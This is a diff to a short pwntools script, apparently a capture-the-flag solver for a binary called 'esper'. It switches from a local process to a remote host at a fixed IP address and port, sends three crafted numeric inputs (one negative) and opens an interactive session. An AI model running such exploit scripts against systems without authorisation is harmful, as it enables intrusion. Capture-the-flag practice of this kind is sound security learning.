@@ -1,4 +1,15 @@
 from pwn import *
 
 elf = ELF('./esper')
-io = process('./esper')
+#io = process('./esper')
+io = remote('34.146.50.22', 30001)
+io.recvline()
+io.recvline()
+io.sendline('1100')
+io.recvline()
+io.recvline()
+io.sendline('129893')
+io.recvline()
+io.recvline()
+io.sendline('-473649')
+io.interactive()
